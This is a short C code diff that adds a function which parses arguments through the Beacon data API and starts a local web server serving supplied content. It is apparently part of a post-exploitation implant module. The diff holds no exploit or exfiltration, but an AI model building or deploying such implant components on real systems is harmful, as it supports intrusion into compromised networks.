@@ -113,3 +113,13 @@ void WebServerInit(short port, char* content, int contentLength)
 	WEB_RESPONSE* webResponse = WebResponseInit(acceptSocket, content, contentLength);
 	CreateThreadEx(WebResponseThread, webResponse);
 }
+
+void WebServerLocal(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	short port = BeaconDataShort(&parser);
+	char* content = BeaconDataBuffer(&parser);
+	int contentLength = BeaconDataLength(&parser);
+	WebServerInit(port, content, contentLength);
+}
